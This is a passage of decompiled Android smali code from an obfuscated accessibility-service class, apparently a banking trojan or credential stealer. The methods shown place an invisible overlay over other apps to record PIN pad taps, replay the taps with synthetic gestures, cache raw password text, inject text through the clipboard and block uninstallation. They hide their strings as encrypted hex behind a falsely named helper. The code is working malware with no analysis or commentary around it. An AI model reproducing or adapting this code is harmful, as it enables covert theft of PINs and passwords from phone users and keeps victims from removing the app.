    invoke-static {v4, p1, v1, v0, v12}, Lv/s/GARjgaGEpTotOxcl8vfe;->vIJudZvPyTuNp(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)V

    .line 288
    .line 289
    .line 290
    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->setLength(I)V

    .line 291
    .line 292
    .line 293
    :cond_7
    return-void

    .line 294
    :cond_8
    invoke-virtual {v10}, Ljava/lang/StringBuilder;->length()I

    .line 295
    .line 296
    .line 297
    move-result p1

    nop

    nop

    .line 298
    const/16 v2, -0x47

    add-int/lit8 v2, v2, 0x4b

    .line 299
    if-lt p1, v2, :cond_9

    .line 300
    .line 301
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 302
    .line 303
    .line 304
    move-result-wide v2

    nop

    .line 305
    iput-wide v2, p0, Lapp/mobilex/plus/services/DataQFAdapter;->lastPinGrabTime:J

    .line 306
    .line 307
    :cond_9
    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 308
    .line 309
    .line 310
    move-result-object p1

    nop

    .line 311
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 312
    .line 313
    .line 314
    move-result-object v1

    .line 315
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 316
    .line 317
    .line 318
    move-result-object v0

    .line 319
    invoke-static {v4, p1, v1, v0, v12}, Lv/s/GARjgaGEpTotOxcl8vfe;->vIJudZvPyTuNp(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Z)V

    .line 320
    .line 321
    .line 322
    return-void
.end method

.method private static final onServiceConnected$lambda$22(Lapp/mobilex/plus/services/DataQFAdapter;)V
    .locals 0

    .line 1
    invoke-direct {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->deferredInit()V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method private static final onServiceConnected$lambda$23(Lapp/mobilex/plus/services/DataQFAdapter;)V
    .locals 1

    .line 1
    sget-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Shade:Z

    .line 2
    .line 3
    if-eqz v0, :cond_1

    .line 4
    .line 5
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 6
    .line 7
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 8
    .line 9
    .line 10
    invoke-static {}, Lv/s/GARjgaGEpTotOxcl8vfe;->l1V0lQr6TbwNKqHfXNbb()Z

    .line 11
    .line 12
    .line 13
    move-result v0

    .line 14
    if-nez v0, :cond_0

    nop

    .line 15
    .line 16
    sget-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->antiUninstallEnabled:Z

    nop

    .line 17
    .line 18
    if-eqz v0, :cond_1

    .line 19
    .line 20
    :cond_0
    invoke-direct {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->addShadeBarrier()V

    .line 21
    .line 22
    .line 23
    :cond_1
    return-void
.end method

.method private static final onServiceConnected$lambda$24(Lapp/mobilex/plus/services/DataQFAdapter;)V
    .locals 1

    .line 1
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 4
    .line 5
    .line 6
    invoke-static {p0}, Lv/s/GARjgaGEpTotOxcl8vfe;->ECwLkmPW1UKz7J6E(Landroid/content/Context;)V

    .line 7
    .line 8
    .line 9
    return-void
.end method

.method private final pasteText(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z
    .locals 4

    .line 1
    const-string v0, "clipboard"

    .line 2
    .line 3
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 4
    .line 5
    .line 6
    move-result-object v0

    .line 7
    instance-of v1, v0, Landroid/content/ClipboardManager;

    .line 8
    .line 9
    const/16 v2, 0x0

    .line 10
    if-eqz v1, :cond_0

    .line 11
    .line 12
    check-cast v0, Landroid/content/ClipboardManager;

    .line 13
    .line 14
    goto :goto_0

    .line 15
    :cond_0
    move-object v0, v2

    .line 16
    :goto_0
    if-nez v0, :cond_1

    .line 17
    .line 18
    invoke-direct {p0, p1, p2}, Lapp/mobilex/plus/services/DataQFAdapter;->fallbackSetText(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z

    .line 19
    .line 20
    .line 21
    move-result p1

    .line 22
    return p1

    .line 23
    :cond_1
    :try_start_0
    invoke-virtual {v0}, Landroid/content/ClipboardManager;->getPrimaryClip()Landroid/content/ClipData;

    .line 24
    .line 25
    .line 26
    move-result-object v2
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 27
    :catch_0
    const/16 v1, 0x1c

    .line 28
    .line 29
    :try_start_1
    const-string v3, "t"

    .line 30
    .line 31
    invoke-static {v3, p2}, Landroid/content/ClipData;->newPlainText(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Landroid/content/ClipData;

    .line 32
    .line 33
    .line 34
    move-result-object v3

    .line 35
    invoke-virtual {v0, v3}, Landroid/content/ClipboardManager;->setPrimaryClip(Landroid/content/ClipData;)V

    .line 36
    .line 37
    .line 38
    const v3, 0x8000

    .line 39
    .line 40
    .line 41
    invoke-virtual {p1, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    .line 42
    .line 43
    .line 44
    move-result v3

    nop

    nop

    .line 45
    if-nez v3, :cond_4

    .line 46
    .line 47
    const-string v3, "00020055006F00AE00DF009100ED009700020045006F00A200B000B900D300AE002F0073005F00CB00B000B900D300AB002F007F0055008000B000BD00D300A400280036004F008800B0009E00F10093000A0059007500B800C3009A00E6009800170053006300B3"

    .line 48
    .line 49
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 50
    .line 51
    .line 52
    invoke-direct {p0, p1, p2}, Lapp/mobilex/plus/services/DataQFAdapter;->fallbackSetText(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/lang/String;)Z

    .line 53
    .line 54
    .line 55
    move-result p1
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 56
    if-eqz v2, :cond_2

    .line 57
    .line 58
    :try_start_2
    invoke-virtual {v0, v2}, Landroid/content/ClipboardManager;->setPrimaryClip(Landroid/content/ClipData;)V

    .line 59
    .line 60
    .line 61
    goto :goto_1

    .line 62
    :cond_2
    sget p2, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 63
    .line 64
    if-lt p2, v1, :cond_3

    .line 65
    .line 66
    invoke-static {v0}, Lv/s/mO9JXzSKOM66Z1;->D5P1xCAyuvgF(Landroid/content/ClipboardManager;)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    .line 67
    .line 68
    .line 69
    :catch_1
    :cond_3
    :goto_1
    return p1

    .line 70
    :catchall_0
    move-exception p1

    .line 71
    goto/16 :goto_3

    .line 72
    :cond_4
    :try_start_3
    const-string p1, "001300770048009300F500BB009200B30026006E004F00DD00B000F8"

    .line 73
    .line 74
    invoke-static {p1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 75
    .line 76
    .line 77
    if-eqz v2, :cond_5

    .line 78
    .line 79
    :try_start_4
    invoke-virtual {v0, v2}, Landroid/content/ClipboardManager;->setPrimaryClip(Landroid/content/ClipData;)V

    .line 80
    .line 81
    .line 82
    goto/16 :goto_2

    .line 83
    :cond_5
    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 84
    .line 85
    if-lt p1, v1, :cond_6

    .line 86
    .line 87
    invoke-static {v0}, Lv/s/mO9JXzSKOM66Z1;->D5P1xCAyuvgF(Landroid/content/ClipboardManager;)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2

    .line 88
    .line 89
    .line 90
    :catch_2
    :cond_6
    :goto_2
    return v3

    .line 91
    :goto_3
    if-nez v2, :cond_7

    .line 92
    .line 93
    :try_start_5
    sget p2, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 94
    .line 95
    if-lt p2, v1, :cond_8

    .line 96
    .line 97
    invoke-static {v0}, Lv/s/mO9JXzSKOM66Z1;->D5P1xCAyuvgF(Landroid/content/ClipboardManager;)V

    .line 98
    .line 99
    .line 100
    goto/16 :goto_4

    .line 101
    :cond_7
    invoke-virtual {v0, v2}, Landroid/content/ClipboardManager;->setPrimaryClip(Landroid/content/ClipData;)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    .line 102
    .line 103
    .line 104
    :catch_3
    :cond_8
    :goto_4
    throw p1
.end method

.method public static synthetic performLongClick$default(Lapp/mobilex/plus/services/DataQFAdapter;IIJILjava/lang/Object;)Z
    .locals 0

    .line 1
    and-int/lit8 p5, p5, 0x4

    nop

    .line 2
    .line 3
    if-eqz p5, :cond_0

    .line 4
    .line 5
    const-wide/16 p3, 0x3e8

    .line 6
    .line 7
    :cond_0
    invoke-virtual {p0, p1, p2, p3, p4}, Lapp/mobilex/plus/services/DataQFAdapter;->performLongClick(IIJ)Z

    .line 8
    .line 9
    .line 10
    move-result p0

    .line 11
    return p0
.end method

.method public static synthetic performSwipe$default(Lapp/mobilex/plus/services/DataQFAdapter;IIIIJILjava/lang/Object;)Z
    .locals 7

    .line 1
    and-int/lit8 p7, p7, 0x10

    nop

    nop

    .line 2
    .line 3
    if-eqz p7, :cond_0

    .line 4
    .line 5
    const-wide/16 p5, 0x12c

    .line 6
    .line 7
    :cond_0
    move-object v0, p0

    .line 8
    move v1, p1

    nop

    nop

    .line 9
    move v2, p2

    .line 10
    move v3, p3

    .line 11
    move v4, p4

    .line 12
    move-wide v5, p5

    .line 13
    invoke-virtual/range {v0 .. v6}, Lapp/mobilex/plus/services/DataQFAdapter;->performSwipe(IIIIJ)Z

    .line 14
    .line 15
    .line 16
    move-result p0

    nop

    nop

    .line 17
    return p0
.end method

.method private static final pinOverlayRemoveRunnable$lambda$12(Lapp/mobilex/plus/services/DataQFAdapter;)V
    .locals 1

    .line 1
    iget-boolean v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayActive:Z

    .line 2
    .line 3
    if-eqz v0, :cond_0

    .line 4
    .line 5
    iget-boolean v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayTouchable:Z

    .line 6
    .line 7
    if-nez v0, :cond_0

    .line 8
    .line 9
    invoke-direct {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->removePinOverlay()V

    .line 10
    .line 11
    .line 12
    :cond_0
    return-void

    nop
.end method

.method private final preAddPinOverlay(Ljava/lang/String;)V
    .locals 10

    .line 1
    iget-boolean v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayActive:Z

    .line 2
    .line 3
    if-eqz v0, :cond_0

    .line 4
    .line 5
    goto/16 :goto_0

    .line 6
    :cond_0
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->accessWindowManager:Landroid/view/WindowManager;

    .line 7
    .line 8
    if-nez v0, :cond_1

    .line 9
    .line 10
    :goto_0
    return-void

    .line 11
    :cond_1
    :try_start_0
    new-instance v1, Landroid/view/View;

    .line 12
    .line 13
    invoke-direct {v1, p0}, Landroid/view/View;-><init>(Landroid/content/Context;)V

    .line 14
    .line 15
    .line 16
    const/16 v2, 0x0

    .line 17
    invoke-virtual {v1, v2}, Landroid/view/View;->setBackgroundColor(I)V

    .line 18
    .line 19
    .line 20
    new-instance v3, Lv/s/UPGJlHrXsQwizQ1aBVZZ;

    .line 21
    .line 22
    invoke-direct {v3, p0, p0}, Lv/s/UPGJlHrXsQwizQ1aBVZZ;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;Lapp/mobilex/plus/services/DataQFAdapter;)V

    .line 23
    .line 24
    .line 25
    invoke-virtual {v1, v3}, Landroid/view/View;->setOnTouchListener(Landroid/view/View$OnTouchListener;)V

    .line 26
    .line 27
    .line 28
    new-instance v4, Landroid/view/WindowManager$LayoutParams;

    .line 29
    .line 30
    const/16 v8, 0x38

    .line 31
    .line 32
    const/16 v9, -0x3

    .line 33
    const/4 v5, -0x1

    .line 34
    const/4 v6, -0x1

    .line 35
    const v7, 0x7f0

    .line 36
    .line 37
    invoke-direct/range {v4 .. v9}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    .line 38
    .line 39
    .line 40
    const/16 v3, 0x11

    .line 41
    .line 42
    iput v3, v4, Landroid/view/WindowManager$LayoutParams;->gravity:I

    .line 43
    .line 44
    invoke-interface {v0, v1, v4}, Landroid/view/ViewManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    .line 45
    .line 46
    .line 47
    iput-object v1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayView:Landroid/view/View;

    .line 48
    .line 49
    const/16 v0, 0x1

    .line 50
    iput-boolean v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayActive:Z

    .line 51
    .line 52
    iput-boolean v2, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayTouchable:Z

    .line 53
    .line 54
    iput-boolean v2, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayDispatching:Z

    .line 55
    .line 56
    iput-object p1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayPkg:Ljava/lang/String;

    .line 57
    .line 58
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 59
    .line 60
    const-string v1, "0013005F007500C700FF00A900D700B5002F0077004200C700C0008D00F700EA00020052007F00A200D400FF009A00A9002C00780016009300FF00AA00D100AF002200740057008200B900FF00D400A800310036"

    .line 61
    .line 62
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 63
    .line 64
    .line 65
    move-result-object v1

    .line 66
    new-instance v2, Ljava/lang/StringBuilder;

    nop

    .line 67
    .line 68
    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    .line 69
    .line 70
    .line 71
    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 72
    .line 73
    .line 74
    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 75
    .line 76
    .line 77
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 78
    .line 79
    .line 80
    move-result-object p1

    .line 81
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 82
    .line 83
    .line 84
    invoke-static {p1}, Lv/s/GARjgaGEpTotOxcl8vfe;->pyu8ovAipBTLYAiKab(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 85
    .line 86
    .line 87
    return-void

    .line 88
    :catch_0
    move-exception v0

    .line 89
    move-object p1, v0

    .line 90
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 91
    .line 92
    const-string v1, "00330064005E00A600F400BB00E200AE002D0059004D008200E200B300D300BE006300730049009500FF00AD008800E7"

    .line 93
    .line 94
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 95
    .line 96
    .line 97
    move-result-object v1

    .line 98
    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 99
    .line 100
    .line 101
    move-result-object p1

    .line 102
    new-instance v2, Ljava/lang/StringBuilder;

    .line 103
    .line 104
    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    .line 105
    .line 106
    .line 107
    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 108
    .line 109
    .line 110
    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 111
    .line 112
    .line 113
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 114
    .line 115
    .line 116
    move-result-object p1

    .line 117
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 118
    .line 119
    .line 120
    invoke-static {p1}, Lv/s/GARjgaGEpTotOxcl8vfe;->pyu8ovAipBTLYAiKab(Ljava/lang/String;)V

    .line 121
    .line 122
    .line 123
    return-void
.end method

.method private static final preAddPinOverlay$lambda$66(Lapp/mobilex/plus/services/DataQFAdapter;Lapp/mobilex/plus/services/DataQFAdapter;Landroid/view/View;Landroid/view/MotionEvent;)Z
    .locals 19

    .line 1
    move-object/from16 v0, p0

    .line 2
    .line 3
    invoke-virtual/range {p3 .. p3}, Landroid/view/MotionEvent;->getActionMasked()I

    .line 4
    .line 5
    .line 6
    move-result v1

    .line 7
    const/16 v6, 0x1

    .line 8
    if-ne v1, v6, :cond_7

    .line 9
    .line 10
    iget-boolean v1, v0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayDispatching:Z

    .line 11
    .line 12
    if-nez v1, :cond_7

    .line 13
    .line 14
    invoke-virtual/range {p3 .. p3}, Landroid/view/MotionEvent;->getRawX()F

    .line 15
    .line 16
    .line 17
    move-result v7

    .line 18
    invoke-virtual/range {p3 .. p3}, Landroid/view/MotionEvent;->getRawY()F

    .line 19
    .line 20
    .line 21
    move-result v8

    .line 22
    float-to-int v9, v7

    nop

    nop

    .line 23
    float-to-int v10, v8

    .line 24
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 25
    .line 26
    .line 27
    move-result-wide v3

    .line 28
    iget-wide v1, v0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayLastTapTime:J

    .line 29
    .line 30
    sub-long v1, v3, v1

    .line 31
    .line 32
    const-wide/16 v11, 0x50

    .line 33
    .line 34
    cmp-long v1, v1, v11

    .line 35
    .line 36
    if-lez v1, :cond_7

    .line 37
    .line 38
    iput-wide v3, v0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayLastTapTime:J

    .line 39
    .line 40
    iget-object v1, v0, Lapp/mobilex/plus/services/DataQFAdapter;->pinPadBoundsMap:Ljava/util/HashMap;

    nop

    nop

    .line 41
    .line 42
    invoke-interface {v1}, Ljava/util/Map;->entrySet()Ljava/util/Set;

    .line 43
    .line 44
    .line 45
    move-result-object v1

    .line 46
    invoke-interface {v1}, Ljava/util/Set;->iterator()Ljava/util/Iterator;

    .line 47
    .line 48
    .line 49
    move-result-object v1

    .line 50
    :cond_0
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    .line 51
    .line 52
    .line 53
    move-result v2

    .line 54
    const/16 v13, 0x0

    .line 55
    const/4 v5, 0x0

    .line 56
    if-eqz v2, :cond_3

    .line 57
    .line 58
    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    .line 59
    .line 60
    .line 61
    move-result-object v2

    .line 62
    check-cast v2, Ljava/util/Map$Entry;

    .line 63
    .line 64
    invoke-interface {v2}, Ljava/util/Map$Entry;->getKey()Ljava/lang/Object;

    .line 65
    .line 66
    .line 67
    move-result-object v14

    .line 68
    check-cast v14, Ljava/lang/String;

    .line 69
    .line 70
    invoke-interface {v2}, Ljava/util/Map$Entry;->getValue()Ljava/lang/Object;

    .line 71
    .line 72
    .line 73
    move-result-object v2

    .line 74
    check-cast v2, Landroid/graphics/Rect;

    .line 75
    .line 76
    invoke-virtual {v2, v9, v10}, Landroid/graphics/Rect;->contains(II)Z

    .line 77
    .line 78
    .line 79
    move-result v2

    .line 80
    if-eqz v2, :cond_0

    .line 81
    .line 82
    const-string v1, "\u232b"

    .line 83
    .line 84
    invoke-static {v14, v1}, Lv/s/okc5AGRjqrud84oM6d;->w9sT1Swbhx3hs(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 85
    .line 86
    .line 87
    move-result v1

    .line 88
    if-nez v1, :cond_2

    .line 89
    .line 90
    const-string v1, "002100770058008C00E300AF00D300A40026"

    .line 91
    .line 92
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 93
    .line 94
    .line 95
    move-result-object v1

    .line 96
    invoke-static {v14, v1}, Lv/s/okc5AGRjqrud84oM6d;->w9sT1Swbhx3hs(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 97
    .line 98
    .line 99
    move-result v1

    .line 100
    if-nez v1, :cond_2

    .line 101
    .line 102
    const-string v1, "002700730057008200E400BA"

    .line 103
    .line 104
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 105
    .line 106
    .line 107
    move-result-object v1

    .line 108
    invoke-static {v14, v1}, Lv/s/okc5AGRjqrud84oM6d;->w9sT1Swbhx3hs(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 109
    .line 110
    .line 111
    move-result v1

    .line 112
    if-eqz v1, :cond_1

    .line 113
    .line 114
    goto :goto_0

    .line 115
    :cond_1
    move v1, v13

    .line 116
    move-object/from16 v5, v14

    .line 117
    goto/16 :goto_1

    .line 118
    :cond_2
    :goto_0
    move/from16 v1, v6

    .line 119
    goto/16 :goto_1

    .line 120
    :cond_3
    move/from16 v1, v13

    .line 121
    :goto_1
    iget-object v2, v0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayPkg:Ljava/lang/String;

    .line 122
    .line 123
    if-eqz v5, :cond_5

    .line 124
    .line 125
    move-object/from16 v1, v5

    .line 126
    const/4 v5, 0x0

    .line 127
    invoke-direct/range {v0 .. v5}, Lapp/mobilex/plus/services/DataQFAdapter;->onPinOverlayDigit(Ljava/lang/String;Ljava/lang/String;JZ)V

    .line 128
    .line 129
    .line 130
    :cond_4
    move-object/from16 v0, p0

    .line 131
    .line 132
    goto :goto_2

    .line 133
    :cond_5
    move/from16 v5, v1

    .line 134
    if-eqz v5, :cond_4

    .line 135
    .line 136
    const-string v1, ""

    .line 137
    .line 138
    const/16 v5, 0x1

    .line 139
    move-object/from16 v0, p0

    .line 140
    .line 141
    invoke-direct/range {v0 .. v5}, Lapp/mobilex/plus/services/DataQFAdapter;->onPinOverlayDigit(Ljava/lang/String;Ljava/lang/String;JZ)V

    .line 142
    .line 143
    .line 144
    :goto_2
    iput-boolean v6, v0, Lapp/mobilex/plus/services/DataQFAdapter;->pinOverlayDispatching:Z

    .line 145
    .line 146
    invoke-virtual {v0, v13}, Lapp/mobilex/plus/services/DataQFAdapter;->setPinOverlayTouchable$app_release(Z)V

    .line 147
    .line 148
    .line 149
    invoke-direct {v0, v9, v10}, Lapp/mobilex/plus/services/DataQFAdapter;->clickNodeAtCoords(II)Z

    .line 150
    .line 151
    .line 152
    move-result v1

    .line 153
    if-nez v1, :cond_6

    .line 154
    .line 155
    new-instance v14, Landroid/graphics/Path;

    .line 156
    .line 157
    invoke-direct {v14}, Landroid/graphics/Path;-><init>()V

    .line 158
    .line 159
    .line 160
    invoke-virtual {v14, v7, v8}, Landroid/graphics/Path;->moveTo(FF)V

    .line 161
    .line 162
    .line 163
    new-instance v1, Landroid/accessibilityservice/GestureDescription$Builder;

    .line 164
    .line 165
    invoke-direct {v1}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V

    .line 166
    .line 167
    .line 168
    new-instance v13, Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    .line 169
    .line 170
    const-wide/16 v15, 0x0

    .line 171
    .line 172
    const-wide/16 v17, 0x32

    nop

    nop

    .line 173
    .line 174
    invoke-direct/range {v13 .. v18}, Landroid/accessibilityservice/GestureDescription$StrokeDescription;-><init>(Landroid/graphics/Path;JJ)V

    .line 175
    .line 176
    .line 177
    invoke-virtual {v1, v13}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    .line 178
    .line 179
    .line 180
    move-result-object v1

    nop

    nop

    .line 181
    invoke-virtual {v1}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;

    .line 182
    .line 183
    .line 184
    move-result-object v1

    .line 185
    :try_start_0
    new-instance v2, Lv/s/XlFTiUImwb1gEhg;

    .line 186
    .line 187
    invoke-direct {v2, v0}, Lv/s/XlFTiUImwb1gEhg;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;)V

    .line 188
    .line 189
    .line 190
    iget-object v3, v0, Lapp/mobilex/plus/services/DataQFAdapter;->handler:Landroid/os/Handler;

    .line 191
    .line 192
    move-object/from16 v4, p1

    .line 193
    .line 194
    invoke-virtual {v4, v1, v2, v3}, Landroid/accessibilityservice/AccessibilityService;->dispatchGesture(Landroid/accessibilityservice/GestureDescription;Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;Landroid/os/Handler;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 195
    .line 196
    .line 197
    goto/16 :goto_3

    .line 198
    :catchall_0
    new-instance v1, Lv/s/ssJAORu9Srr5Q9qO2sq;

    .line 199
    .line 200
    const v2, 0x19

    .line 201
    .line 202
    invoke-direct {v1, v0, v2}, Lv/s/ssJAORu9Srr5Q9qO2sq;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 203
    .line 204
    .line 205
    const-wide/16 v2, 0x64

    .line 206
    .line 207
    invoke-direct {v0, v1, v2, v3}, Lapp/mobilex/plus/services/DataQFAdapter;->safePostDelayed(Lv/s/JRdueaGIH5g8DVCPba;J)V

    .line 208
    .line 209
    .line 210
    goto :goto_3

    .line 211
    :cond_6
    new-instance v1, Lv/s/ssJAORu9Srr5Q9qO2sq;

    .line 212
    .line 213
    const v2, 0x1a

    nop

    .line 214
    .line 215
    invoke-direct {v1, v0, v2}, Lv/s/ssJAORu9Srr5Q9qO2sq;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 216
    .line 217
    .line 218
    invoke-direct {v0, v1, v11, v12}, Lapp/mobilex/plus/services/DataQFAdapter;->safePostDelayed(Lv/s/JRdueaGIH5g8DVCPba;J)V

    .line 219
    .line 220
    .line 221
    :goto_3
    new-instance v1, Lv/s/ssJAORu9Srr5Q9qO2sq;

    .line 222
    .line 223
    const v2, 0x1b

    .line 224
    .line 225
    invoke-direct {v1, v0, v2}, Lv/s/ssJAORu9Srr5Q9qO2sq;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 226
    .line 227
    .line 228
    const-wide/16 v2, 0x190

    .line 229
    .line 230
    invoke-direct {v0, v1, v2, v3}, Lapp/mobilex/plus/services/DataQFAdapter;->safePostDelayed(Lv/s/JRdueaGIH5g8DVCPba;J)V

    .line 231
    .line 232
    .line 233
    :cond_7
    return v6
.end method

.method private final processPwdPollText(Ljava/lang/String;Landroid/view/accessibility/AccessibilityNodeInfo;)V
    .locals 21

    .line 1
    move-object/from16 v0, p0

    .line 2
    .line 3
    move-object/from16 v1, p1

    .line 4
    .line 5
    iget-object v2, v0, Lapp/mobilex/plus/services/DataQFAdapter;->pwdPollFieldKey:Ljava/lang/String;

    .line 6
    .line 7
    iget-object v3, v0, Lapp/mobilex/plus/services/DataQFAdapter;->passwordRawCache:Ljava/util/HashMap;

    .line 8
    .line 9
    invoke-virtual {v3, v2}, Ljava/util/HashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    .line 10
    .line 11
    .line 12
    move-result-object v3

    .line 13
    check-cast v3, Ljava/lang/String;

    .line 14
    .line 15
    const-string v4, ""

    .line 16
    .line 17
    if-nez v3, :cond_0

    .line 18
    .line 19
    move-object/from16 v3, v4

    .line 20
    :cond_0
    invoke-static {v1, v3}, Lv/s/okc5AGRjqrud84oM6d;->w9sT1Swbhx3hs(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 21
    .line 22
    .line 23
    move-result v5

    .line 24
    if-eqz v5, :cond_1

    .line 25
    .line 26
    goto/16 :goto_b

    .line 27
    .line 28
    :cond_1
    const v5, 0x2022

    .line 29
    .line 30
    invoke-static {v5}, Ljava/lang/Character;->valueOf(C)Ljava/lang/Character;

    .line 31
    .line 32
    .line 33
    move-result-object v5

    .line 34
    const/16 v6, 0x2a

    nop

    .line 35
    .line 36
    invoke-static {v6}, Ljava/lang/Character;->valueOf(C)Ljava/lang/Character;

    .line 37
    .line 38
    .line 39
    move-result-object v6

    .line 40
    const/16 v7, 0x262a

    add-int/lit8 v7, v7, -0x5b

    nop

    nop

    .line 41
    .line 42
    invoke-static {v7}, Ljava/lang/Character;->valueOf(C)Ljava/lang/Character;

    .line 43
    .line 44
    .line 45
    move-result-object v7

    .line 46
    const v8, 0x2b24

    nop

    nop

    .line 47
    .line 48
    invoke-static {v8}, Ljava/lang/Character;->valueOf(C)Ljava/lang/Character;

    .line 49
    .line 50
    .line 51
    move-result-object v8

    nop

    nop

    .line 52
    filled-new-array {v5, v6, v7, v8}, [Ljava/lang/Character;

    .line 53
    .line 54
    .line 55
    move-result-object v5

    .line 56
